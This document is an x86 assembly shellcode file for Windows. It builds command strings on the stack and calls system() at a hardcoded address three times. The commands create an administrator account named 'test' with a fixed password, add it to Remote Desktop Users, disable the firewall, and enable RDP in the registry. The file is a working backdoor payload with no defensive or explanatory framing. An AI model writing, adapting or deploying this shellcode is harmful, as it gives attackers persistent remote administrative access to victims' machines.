[BITS 32]

global _start			

section .text
_start:

    ; Add a new user
    xor edx, edx	; zero out edx
    push edx		; push null byte onto stack
    
    ; net user test P@ssword123 /add & net localgroup administrators test /add & net localgroup "Remote desktop users" test /add
    push 0x20206464
    push 0x612f2074
    push 0x73657420
    push 0x22737265
    push 0x73752070
    push 0x6f746b73
    push 0x65642065
    push 0x746f6d65
    push 0x52222070
    push 0x756f7267
    push 0x6c61636f
    push 0x6c207465
    push 0x6e202620
    push 0x6464612f
    push 0x20747365
    push 0x74207372
    push 0x6f746172
    push 0x7473696e
    push 0x696d6461
    push 0x2070756f
    push 0x72676c61
    push 0x636f6c20
    push 0x74656e20
    push 0x26206464
    push 0x612f2033
    push 0x32316472
    push 0x6f777373
    push 0x40502074
    push 0x73657420
    push 0x72657375
    push 0x2074656e

    mov ebx, esp	; save stack pointer 
    push ebx		; push pointer to add user command
    mov edx, 0x77c293c7	; mov address of system
    call edx

    ; Disable the firewall
    xor edx, edx        ; zero out edx
    push edx            ; push null byte onto stack

    ; 'netsh firewall set opmode disable   '
    push 0x20202065
    push 0x6c626173
    push 0x69642065
    push 0x646f6d70
    push 0x6f207465
    push 0x73206c6c
    push 0x61776572
    push 0x69662068
    push 0x7374656e

    mov ebx, esp        ; save stack pointer to the disable firewall command
    push ebx            ; push pointer to command
    mov edx, 0x77c293c7 ; mov address of system
    call edx

    ; Enable RDP
    xor edx, edx        ; zero out edx
    push edx            ; push null byte onto stack

    ; 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
    push 0x662f2030
    push 0x20642f20
    push 0x44524f57
    push 0x445f4745
    push 0x5220742f
    push 0x20736e6f
    push 0x69746365
    push 0x6e6e6f43
    push 0x5354796e
    push 0x65446620
    push 0x762f2022
    push 0x72657672
    push 0x6553206c
    push 0x616e696d
    push 0x7265545c
    push 0x6c6f7274
    push 0x6e6f435c
    push 0x7465536c
    push 0x6f72746e
    push 0x6f43746e
    push 0x65727275
    push 0x435c4d45
    push 0x54535953
    push 0x5c454e49
    push 0x4843414d
    push 0x5f4c4143
    push 0x4f4c5f59
    push 0x454b4822
    push 0x20646461
    push 0x20676572

    mov ebx, esp        ; save stack pointer to enable RDP command
    push ebx            ; push stack pointer
    mov edx, 0x77c293c7 ; mov address of system
    call edx

